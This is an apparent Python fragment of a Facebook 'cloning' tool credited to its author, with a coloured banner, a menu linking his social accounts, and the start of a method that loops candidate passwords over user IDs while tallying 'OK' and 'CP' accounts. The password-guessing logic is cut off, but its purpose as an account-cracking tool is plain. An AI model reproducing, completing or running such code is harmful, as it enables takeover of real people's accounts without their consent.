...
#Tools MD.ISMAIL HOSSEN
#update no : 1
#Md-ISMAIL-HOSSEN
#Programer ISMAIL-HOSSEN 
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
logo ="""
\033[1;97m
\033[93;1m__________________    ___ ___         ________________________________    _____   ____ _______  ___
\033[93;1m\______   \______ \  /   |   \        \__    ___/\_   _____/\______   \  /     \ |    |   \   \/  /
\033[93;1m |    |  _/|    |  \/    ~    \  ______ |    |    |    __)_  |       _/ /  \ /  \|    |   /\     / 
\033[93;1m |    |   \|    `   \    Y    / /_____/ |    |    |        \ |    |   \/    Y    \    |  / /     \ 
\033[93;1m |______  /_______  /\___|_  /          |____|   /_______  / |____|_  /\____|__  /______/ /___/\  \                                                                                                                                                 
\033[93;1m╭──────────•◈•───────────────────╮
\033[93;1m[-] TOOLS     RANDOM 2009 CLONING
\033[93;1m[-] VERSION    2.0.0 (V2)
\033[93;1m[-] AUTHOR    MD.ISMAIL HOSSEN
\033[93;1m[-] GITHUB      ismaildada
\033[93;1m[-] CREATOR  MD-ISMAIL HOSSEN   
\033[93;1m╰──────────•◈•───────────────────╯  
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system("xdg-open https://youtube.com/@bdh-termux3619")
			print("")
			time.sleep(2.0)
		...
		print(' \x1b[1;32m[4] \x1b[1;32mFOLLOW MY GITHUB')
		print(' \x1b[1;32m[00] \x1b[1;31mEXIT')
		SNIGDHO =input('\n   \x1b[1;32m Choose option >>> ')
		if SNIGDHO in ["1", "01"]:
			self.fbtua()
		if SNIGDHO in ["2", "02"]:
			os.system('xdg-open https://www.facebook.com/ismail123450?mibextid=ZbWKwL')
		if SNIGDHO in ["3", "03"]:
			os.system('xdg-open https://youtube.com/@bdh-termux3619')
		if SNIGDHO in ["4", "04"]:
			os.system('xdg-open https://github.com/ismaildada')
		if SNIGDHO in ["0", "00"]:
			self.old2()
			exit()
		else:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[EHAN] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
